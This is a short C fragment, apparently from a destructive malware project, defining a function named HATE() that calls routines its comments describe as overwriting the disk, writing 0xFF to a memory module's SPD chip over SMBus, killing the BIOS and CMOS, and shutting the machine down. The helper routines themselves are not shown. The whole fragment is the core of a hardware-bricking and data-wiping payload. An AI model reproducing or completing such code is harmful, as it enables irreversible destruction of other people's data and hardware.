void HATE(){ 
    test_write(); //disk thing (writes on disk.)
    smbus_write_byte(0x10, 0xFF); //write on SPD 
    CMDS(); //BIOS KILLER+CMOS KILLER.
    shutdown(); // shutdown the PC/vm. (sometims migth not work.)
    //"shutdown,cmos etc..." are loaded from the main.c using #include
}